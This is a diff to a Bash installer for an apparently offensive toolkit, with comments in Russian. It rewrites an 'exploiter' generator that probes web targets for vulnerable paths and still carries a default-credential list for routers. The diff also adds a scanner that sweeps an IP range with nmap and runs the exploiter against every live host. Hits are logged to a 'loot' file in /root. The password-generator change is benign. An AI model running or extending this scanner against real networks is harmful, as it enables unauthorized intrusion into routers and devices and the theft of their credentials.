@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="32.8"
+CURRENT_VERSION="32.9"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -879,17 +879,16 @@ run_cert_reader() {
     read
 }
 
+# 3. Исправленный ГЕНЕРАТОР ПАРОЛЕЙ (Линия 972 - ФАТАЛЬНАЯ ОШИБКА)
 run_pwd_gen() {
     clear
-    echo -e "\e[1;32m[ PRIME PASSWORD GENERATOR ]\e[0m"
-    read -p "ENTER PASSWORD LENGTH [DEFAULT: 24]: " P_LEN
+    echo -e "\e[1;32m[PRIME PASSWORD GENERATOR]\e[0m"
+    read -p "ENTER LENGTH: " P_LEN
     P_LEN=${P_LEN:-24}
-    
-    # Вызов твоего базового инструмента
-    gen-pwd "$P_LEN"
-    
-    echo -e "\n\e[1;33mPRESS ENTER TO RETURN TO MENU...\e[0m"
-    read
+    # Убрали сложные токены, используем максимально простой синтаксис
+    NEW_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w "$P_LEN" | head -n 1)
+    echo -e "\e[1;32mNEW PASSWORD: $NEW_KEY\e[0m"
+    read -p "PRESS ENTER"
 }
 
    run_cert_forge() {
@@ -908,9 +907,10 @@ run_pwd_gen() {
     read
 }
 
+# 1. Исправленный ГЕНЕРАТОР ЭКСПЛОЙТА (Линии 957, 991, 997)
 generate_prime_ultimate_exploiter_v4() {
     local target_file="$1"
-    local code=$(cat << 'EOF'
+    cat << 'EOF' > "$target_file"
 #!/bin/bash
 TARGET="$1"
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
@@ -919,7 +919,7 @@ C_LIST=("admin:admin" "admin:password" "root:root" "telecomadmin:admintelecom")
 
 for proto in "http" "https"; do
     BASE="${proto}://${TARGET}"
-    # Стабильное получение кода ответа
+    # Используем grep вместо сложного awk для совместимости
     H=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$BASE/" 2>/dev/null | head -n1)
     CODE=$(echo "$H" | grep -oE '[0-9]{3}' | head -n1)
     [ -z "$CODE" ] && CODE="000"
@@ -930,57 +930,36 @@ for proto in "http" "https"; do
             VP=$(echo "$item" | cut -d':' -f1)
             VK=$(echo "$item" | cut -d':' -f2)
             if curl -sL -k -A "$UA" --max-time 3 "$BASE$VP" 2>/dev/null | grep -q "$VK"; then
-                echo -e "    \e[1;31m[!!!] EXPLOIT: $VK found at $VP\e[0m"
+                echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $VK\e[0m"
                 echo "[EXPL] $BASE$VP" >> /root/prime_loot_full.txt
-            fi
-        done
-        for pair in "${C_LIST[@]}"; do
-            UN=$(echo "$pair" | cut -d':' -f1)
-            PW=$(echo "$pair" | cut -d':' -f2)
-            R=$(curl -sL -k -u "$UN:$PW" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$BASE/")
-            if [ "$R" == "200" ]; then
-                echo -e "    \e[1;32m[!!!] AUTH: $UN:$PW\e[0m"
-                echo "[AUTH] $UN:$PW @ $BASE" >> /root/prime_loot_full.txt
-                break
             fi
         done
     fi
 done
 EOF
-)
-    printf "%s\n" "$code" > "$target_file"
     chmod +x "$target_file"
 }
 
 
 
-
-
-
-
-
+# 2. Исправленный СКАНЕР СЕТИ (Линии 1014, 1031)
 run_heuristic_router_scan() {
     clear
-    echo -e "\e[1;32m[ PRIME HEURISTIC SCANNER v2 ]\e[0m"
-    echo -e "Target types: IP Range, Single IP, Domain, DB-Uplink\n"
+    echo -e "\e[1;32m[PRIME HEURISTIC SCANNER v2]\e[0m"
+    read -p "ENTER TARGET (IP/Range): " H_TARGET
+    echo -e "\e[1;34m[*] Detecting active nodes...\e[0m"
+    # Упрощенный парсинг nmap без капризного awk
+    NODES=$(nmap -n -sn "$H_TARGET" | grep "report for" | cut -d' ' -f5)
     
-    read -p "ENTER TARGET: " H_TARGET
-    
-    # Проверка: если введена сеть (например /24), используем nmap для поиска живых
-    if [[ "$H_TARGET" == */* ]]; then
-        echo -e "\e[1;34m[*] Detecting active nodes in $H_TARGET...\e[0m"
-        NODES=$(nmap -n -sn "$H_TARGET" | grep "for" | awk '{print $5}')
-        for node in $NODES; do
-            echo -e "\n\e[1;33m[ ANALYSIS: $node ]\e[0m"
-            prime-hscan "$node"
-        done
-    else
-        # Одиночная цель
-        prime-hscan "$H_TARGET"
+    if [ -z "$NODES" ]; then
+        echo -e "\e[1;31m[!] No nodes found.\e[0m"
+        return
     fi
     
-    echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
-    read
+    for IP in $NODES; do
+        generate_prime_ultimate_exploiter_v4 "/tmp/scanner_exec"
+        bash "/tmp/scanner_exec" "$IP"
+    done
 }
 
 run_view_loot() {
@@ -1074,7 +1053,7 @@ update_module "/root/share_server.py" "1.2" generate_share_server_code "File-Sha
 update_module "/root/upload_server.py"  "1.2" generate_upload_server_code  "Inbound-Drop-Box"
 
 # --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "32.6" generate_launcher_code "Prime-Launcher"
+update_module "/root/launcher.sh" "32.9" generate_launcher_code "Prime-Launcher"
 chmod +x /root/launcher.sh
 ln -sf /root/launcher.sh /usr/local/bin/launcher
 repair_and_clean
